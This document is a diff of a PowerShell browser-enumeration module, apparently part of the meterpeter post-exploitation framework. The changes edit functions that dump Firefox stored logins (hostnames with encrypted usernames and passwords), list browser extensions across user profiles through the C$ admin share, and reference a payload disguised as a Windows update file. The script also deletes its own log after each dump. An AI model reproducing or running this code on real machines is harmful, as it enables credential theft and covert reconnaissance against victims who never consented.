@@ -21,20 +21,16 @@
    Enumerates FireFox Browser information Only.
 
 .EXAMPLE
-   PS C:\> ./GetBrowsers.ps1 -ADDONS
-   Enumerates ALL browsers extentions installed (ADDONS)
-
-.EXAMPLE
    PS C:\> ./GetBrowsers.ps1 -ALL
    Enumerates Internet Explorer (IE), FireFox and Chrome Browsers information.
 
 .EXAMPLE
-   PS C:\> ./GetBrowsers.ps1 -IE $env:LOCALAPPDATA
-   Enumerates IE Browser Info and writes the logfile to: $env:LOCALAPPDATA\BrowserEnum.log
+   PS C:\> ./GetBrowsers.ps1 -CHROME $env:LOCALAPPDATA
+   Enumerates CHROME Browser Info and saves logfile to: $env:LOCALAPPDATA\BrowserEnum.log
 
 .NOTES
-   GetBrowsers will delete the LogFile after every dump (If executed without the 2º argument).
-   If executed with the 2º arg then GetBrowsers will store the logfile in the Input location.
+   GetBrowsers.ps1 will delete the LogFile after every dump (If executed without the 2º argument).
+   If executed with the 2º arg then GetBrowsers.ps1 will store the logfile in the Input location.
 
 .LINK 
     https://github.com/r00t-3xp10it/meterpeter
@@ -67,7 +63,7 @@ If(-not($param1)){
     Get-Content $LogFilePath\BrowserEnum.log;Remove-Item $LogFilePath\BrowserEnum.log -Force
         ## For those who insiste in running this script outside meterpeter
         If(-not(Test-Path "$env:tmp\Update-KB4524147.ps1")){
-            Start-Sleep -Seconds 10
+            Start-Sleep -Seconds 8
         }
     Exit
 }
@@ -376,53 +372,48 @@ function CHROME {
 
 
 function ADDONS {
-    ## Retrieve ALL browsers installed ADDONS
-    echo "`n`nAddOns Installed" >> $LogFilePath\BrowserEnum.log
-    echo "----------------" >> $LogFilePath\BrowserEnum.log
-    
-    ## TODO: Retrieve Office addons (BETA DEV)
-    # $searchScopes = "HKCU:\SOFTWARE\Microsoft\Office\Outlook\Addins","HKLM:\SOFTWARE\Wow6432Node\Microsoft\Office\Outlook\Addins"
-    # $searchScopes | % {Get-ChildItem -Path $_ -ErrorAction SilentlyContinue| % {Get-ItemProperty -Path $_.PSPath} | Select-Object @{n="Name";e={Split-Path $_.PSPath -leaf}},FriendlyName} | Sort-Object -Unique -Property name >> $LogFilePath\BrowserEnum.log
-
-    ## TODO: Retrieve Chrome addons (BETA DEV)
-    If(-not(Test-Path "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json")){
-        echo "None Chrome ADDONS found .." >> $LogFilePath\BrowserEnum.log
-    }else{
-        $Json = Get-Content "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json" -Raw|ConvertFrom-Json|select *
-        $Json|select-object -property name,version,update_url >> $LogFilePath\BrowserEnum.log
-    }
+    ## Retrieve ALL browsers installed ADDONS    
+    ## TODO: Retrieve IE addons (BETA DEV)
 
     ## TODO: Retrieve firefox addons (BETA DEV)
+    echo "`n`n[ Firefox ]" >> $LogFilePath\BrowserEnum.log
     If(-not(Test-Path "$Env:AppData\Mozilla\Firefox\Profiles\*.default\extensions.json")){
-        echo "None FireFox ADDONS found .." >> $LogFilePath\BrowserEnum.log
+        echo "None AddOns found .." >> $LogFilePath\BrowserEnum.log
     }else{
         $Json = Get-Content "$Env:AppData\Mozilla\Firefox\Profiles\*.default\extensions.json" -Raw|ConvertFrom-Json|select *
         $Json.addons|select-object -property id,version,rootURI >> $LogFilePath\BrowserEnum.log
     }
+
+    ## TODO: Retrieve Chrome addons (BETA DEV)
+    echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
+    If(-not(Test-Path "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json")){
+        echo "None AddOns found .." >> $LogFilePath\BrowserEnum.log
+    }else{
+        $Json = Get-Content "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json" -Raw|ConvertFrom-Json|select *
+        $Json|select-object -property name,version,update_url >> $LogFilePath\BrowserEnum.log
+    }
 }
 
 
-function Creds {
+function CREDS_DUMP {
     ## TODO: Retrieve FireFox Credentials
-    echo "`n`nLogins (Firefox)" >> $LogFilePath\BrowserEnum.log
-    echo "--------------------" >> $LogFilePath\BrowserEnum.log
-        If(-not(Test-Path "$Env:AppData\Mozilla\Firefox\Profiles\*.default\logins.json")){
-            echo "FireFox logins.json not found .." >> $LogFilePath\BrowserEnum.log
-        }else{
-            $Json = get-content $Env:AppData\Mozilla\Firefox\Profiles\*.default\logins.json|ConvertFrom-Json|select *
-            $Json.logins|select-object hostname,encryptedUsername >> $LogFilePath\BrowserEnum.log
-            $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
-        }
+    echo "`n`n[ Firefox ]" >> $LogFilePath\BrowserEnum.log
+    If(-not(Test-Path "$Env:AppData\Mozilla\Firefox\Profiles\*.default\logins.json")){
+        echo "FireFox logins.json not found .." >> $LogFilePath\BrowserEnum.log
+    }else{
+        $Json = get-content $Env:AppData\Mozilla\Firefox\Profiles\*.default\logins.json|ConvertFrom-Json|select *
+        $Json.logins|select-object hostname,encryptedUsername >> $LogFilePath\BrowserEnum.log
+        $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
+    }
 }
-
 
 
 ## Jump Links (Functions)
 If($param1 -eq "-IE"){IE_Dump}
-If($param1 -eq "-CREDS"){Creds}
 If($param1 -eq "-CHROME"){CHROME}
 If($param1 -eq "-ADDONS"){ADDONS}
 If($param1 -eq "-FIREFOX"){FIREFOX}
+If($param1 -eq "-CREDS"){CREDS_DUMP}
 If($param1 -eq "-RECON"){BROWSER_RECON}
 If($param1 -eq "-ALL"){BROWSER_RECON;IE_Dump;FIREFOX;CHROME}
 
